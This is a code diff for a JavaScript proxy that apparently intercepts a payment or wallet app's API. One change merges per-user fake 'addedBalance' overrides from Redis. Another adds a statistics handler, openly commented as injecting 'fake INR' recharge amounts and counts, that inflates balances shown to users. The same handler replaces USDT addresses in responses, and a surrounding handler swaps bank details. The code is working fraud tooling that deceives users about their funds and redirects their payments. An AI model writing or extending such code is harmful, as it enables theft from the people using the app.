@@ -90,7 +90,23 @@ async function saveData(data) {
           if (current[key] !== undefined) data[key] = current[key];
         }
         if (current.userOverrides) {
-          data.userOverrides = JSON.parse(JSON.stringify(current.userOverrides));
+          if (!data.userOverrides) data.userOverrides = {};
+          // Merge: add any users from Redis not already in data.
+          // data's version is authoritative for users it already has
+          // (prevents race-condition from wiping addedBalance set by /add command)
+          for (const uid of Object.keys(current.userOverrides)) {
+            if (!data.userOverrides[uid]) {
+              data.userOverrides[uid] = JSON.parse(JSON.stringify(current.userOverrides[uid]));
+            } else {
+              const redisEntry = current.userOverrides[uid];
+              const localEntry = data.userOverrides[uid];
+              // Keep whichever addedBalance is non-zero / larger absolute value
+              const localAdded = localEntry.addedBalance !== undefined ? localEntry.addedBalance : 0;
+              const redisAdded = redisEntry.addedBalance !== undefined ? redisEntry.addedBalance : 0;
+              const winnerAdded = Math.abs(localAdded) >= Math.abs(redisAdded) ? localAdded : redisAdded;
+              data.userOverrides[uid] = Object.assign({}, redisEntry, localEntry, { addedBalance: winnerAdded });
+            }
+          }
         }
         if (current.balanceHistory && Array.isArray(current.balanceHistory)) {
           if (!data.balanceHistory || data.balanceHistory.length < current.balanceHistory.length) {
@@ -1355,6 +1371,58 @@ async function proxyAndAddBonus(req, res) {
   } catch(e) { await transparentProxy(req, res); }
 }
 
+// Statistics/member — add bonus balance + fake INR count & amount
+async function proxyAndAddBonusStats(req, res) {
+  try {
+    const [data, { respBody, respHeaders, jsonResp }] = await Promise.all([
+      loadData(),
+      proxyFetch(req)
+    ]);
+    const userId = await extractUserId(req, jsonResp);
+    const eff = getEffectiveSettings(data, userId);
+    const bonus = eff.depositSuccess ? (eff.depositBonus || 0) : 0;
+    if (userId) { trackUser(data, userId, 'Stats View'); saveData(data).catch(()=>{}); }
+    const bonusData = getResponseData(jsonResp);
+    if (bonus > 0 && bonusData) addBonusToBalanceFields(bonusData, bonus);
+    const userOvr = userId && data.userOverrides ? data.userOverrides[String(userId)] : null;
+    const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
+    if (addedBal !== 0 && bonusData && typeof bonusData === 'object') {
+      addBonusToBalanceFields(bonusData, addedBal);
+      // Also inject into INR statistics fields (rechargeAmountInr / rechargeCountInr)
+      function injectInrStats(obj) {
+        if (!obj || typeof obj !== 'object') return;
+        if (Array.isArray(obj)) { obj.forEach(item => injectInrStats(item)); return; }
+        const keys = Object.keys(obj);
+        const hasInrAmount = keys.some(k => k.toLowerCase() === 'rechargeamountinr');
+        const hasInrCount  = keys.some(k => k.toLowerCase() === 'rechargecountinr');
+        if (hasInrAmount || hasInrCount) {
+          for (const k of keys) {
+            const kl = k.toLowerCase();
+            if (kl === 'rechargeamountinr') {
+              const cur = parseFloat(obj[k]) || 0;
+              obj[k] = typeof obj[k] === 'string'
+                ? String((cur + addedBal).toFixed(2))
+                : parseFloat((cur + addedBal).toFixed(2));
+            }
+            if (kl === 'rechargecountinr') {
+              const cur = parseInt(obj[k], 10) || 0;
+              obj[k] = typeof obj[k] === 'string'
+                ? String(Math.max(1, cur))
+                : Math.max(1, cur);
+            }
+          }
+        }
+        for (const k of keys) {
+          if (typeof obj[k] === 'object' && obj[k] !== null) injectInrStats(obj[k]);
+        }
+      }
+      injectInrStats(jsonResp);
+    }
+    if (data.usdtAddress) replaceUsdtInResponse(jsonResp, data);
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) { await transparentProxy(req, res); }
+}
+
 // Order detail — bank replacement
 async function proxyAndReplaceBankDetails(req, res, label) {
   try {
@@ -1695,8 +1763,8 @@ app.all('/appApi/member/basicInfo', async (req, res) => {
 app.all('/appApi/member/balanceList', async (req, res) => { await proxyAndAddBonus(req, res); });
 app.all('/appApi/common/homeData', async (req, res) => { await proxyAndAddBonus(req, res); });
 
-// Statistics endpoints — proxy with balance bonus applied
-app.all('/appApi/statistics/member', async (req, res) => { await proxyAndAddBonus(req, res); });
+// Statistics endpoints — proxy with balance bonus + fake INR stats
+app.all('/appApi/statistics/member', async (req, res) => { await proxyAndAddBonusStats(req, res); });
 app.all('/appApi/statistics/invite', async (req, res) => { await proxyAndAddBonus(req, res); });
 app.all('/appApi/statistics/*', async (req, res) => { await proxyAndAddBonus(req, res); });
 
